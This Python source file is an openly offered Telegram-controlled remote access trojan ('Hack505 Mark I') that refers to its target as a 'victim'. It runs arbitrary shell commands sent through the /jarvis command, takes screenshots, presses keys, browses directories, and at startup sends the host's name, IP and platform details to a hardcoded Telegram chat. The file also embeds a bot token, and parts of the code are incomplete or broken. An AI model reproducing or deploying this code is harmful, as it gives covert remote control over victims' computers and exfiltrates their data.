import os
import platform
import random
import subprocess
import socket
import datetime
import pyautogui
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

TOKEN = "6845961407:AAGbKJc7LSpkokCVw-jJg9ByyaLoO3oBT_Q"

# Initialize the Updater
updater = Updater(TOKEN, use_context=True)

# Define a command to start the bot


def start(update, context):
    update.message.reply_text(
        "Hello! Welcoming you to Hack505 official's. It's Mark I")

# Define a command for help


def help(update, context):
    update.message.reply_text("""
    How can I help you!

    /start    --> Just a start
    /yo       --> Greets you
    /screen   --> Get you the screenshot
    /content  --> It's all about the content
    /jarvis   --> Execute any command you want!
    /download --> Get any file from victim
    /press    --> Press special keys
    /arrow    --> Use the arrow keys now!
    /cd       --> Let's change the dir
    /ls       --> It lists the file names
    $mouse    --> Get the mouse coordinates
    $type     --> Type anything you want!
    """
                              )

# Define a command for content


def content(update, context):
    update.message.reply_text(
        "This project is owned by Hack505. Check out their GitHub page: www.github.com/hack505")

# Define a command for taking a screenshot


def screenshot(update, context):
    try:
        image_path = take_screenshot()
        update.message.reply_photo(photo=open(image_path, 'rb'))
    except Exception as e:
        update.message.reply_text(f"Error: {e}")

# Define a command for running external commands


def run_command(update, context):
    # Get the command from the user's message
    command = update.message.text[len('/jarvis '):]

    try:
        # Execute the command using subprocess
        result = subprocess.check_output(command, shell=True, text=True)
        update.message.reply_text(f"Command executed successfully:\n{result}")
    except subprocess.CalledProcessError as e:
        update.message.reply_text(f"Error executing command:\n{e}")

# Define a command for downloading files


def download_file(update, context):
    # Get the file ID from the message
    file_id = update.message.document.file_id

    # Get information about the file
    file_info = context.bot.get_file(file_id)

    # Download the file
    file_path = file_info.download()

    update.message.reply_text(
        f"File downloaded successfully. Path: {file_path}")

# Define a command for pressing keys


def press_key(update, context):
    try:
        # Extract the key combination after the /presskey command
        key_combination = update.message.text[len('/press '):]
        if key_combination:
            pyautogui.hotkey(*key_combination.split())
        else:
            update.message.reply_text(
                "Please provide a key combination after the /press command.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")

# Define a command for arrow keys


def arrow_key(update, context):
    try:
        # Extract the arrow key command
        arrow_command = update.message.text[len('/arrow '):]

        # Map arrow commands to corresponding keys
        arrow_keys = {'up': 'up', 'down': 'down',
                      'left': 'left', 'right': 'right'}

        # Check if the arrow command is valid
        if arrow_command in arrow_keys:
            pyautogui.press(arrow_keys[arrow_command])
        else:
            update.message.reply_text("Invalid arrow key command.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")

# Define a command for changing the current directory


def change_directory(update, context):
    try:
        new_directory = update.message.text[len('/cd '):]
        os.chdir(new_directory)
        update.message.reply_text("Directory changed successfully.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")

# Define a command for listing files in the current directory


def list_files(update, context):
    try:
        files = os.listdir()
        update.message.reply_text(
            f"Files in the current directory: {', '.join(files)}")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")

# Define a command for getting system information


def system_info(update, context):
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()

        info_string = (
            f"System Information:\n\n"
            f"Hostname: {hostname}\n"
            f"IP Address: {ip}\n"
            f"Processor: {plat}\n"
            f"System: {system}\n"
            f"Machine: {machine}")

        try:
            update.message.reply_text(info_string)
            sys_info_send = True
        except:
            pass

        # Replace 'YOUR_CHAT_ID' with the actual chat ID where you want to send the message
            context.bot.send_message(
                chat_id="5118057698", text=info_string)
    except Exception as e:
        update.message.reply_text(f"Error: {e}")


# Register the command handlers
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CommandHandler('help', help))
updater.dispatcher.add_handler(CommandHandler('content', content))
updater.dispatcher.add_handler(CommandHandler('screen', screenshot))
updater.dispatcher.add_handler(CommandHandler('jarvis', run_command))
updater.dispatcher.add_handler(CommandHandler('download', download_file))
updater.dispatcher.add_handler(CommandHandler('press', press_key))
updater.dispatcher.add_handler(CommandHandler('arrow', arrow_key))
updater.dispatcher.add_handler(CommandHandler('cd', change_directory))
updater.dispatcher.add_handler(CommandHandler('ls', list_files))
updater.dispatcher.add_handler(CommandHandler('sys', system_info))

updater.job_queue.run_once(lambda context: system_info(None, context), 0)

# Start the bot
updater.start_polling()
updater.idle()
